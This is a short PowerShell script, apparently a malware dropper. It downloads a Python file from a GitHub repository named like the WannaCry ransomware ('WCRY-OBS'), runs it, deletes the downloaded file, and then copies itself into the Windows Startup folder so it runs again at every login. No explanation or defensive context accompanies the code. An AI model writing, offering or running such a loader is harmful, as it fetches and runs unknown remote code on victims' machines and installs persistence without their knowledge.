$scriptName = $MyInvocation.MyCommand.Name
$url = 'https://raw.githubusercontent.com/bookbot2019/WCRY-OBS/main/Oshawott.py'
Invoke-WebRequest -Uri $url -Outfile "Oshawott.py"
python3 "Oshawott.py"
Remove-Item "Oshawott.py"
Move-Item $scriptName "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"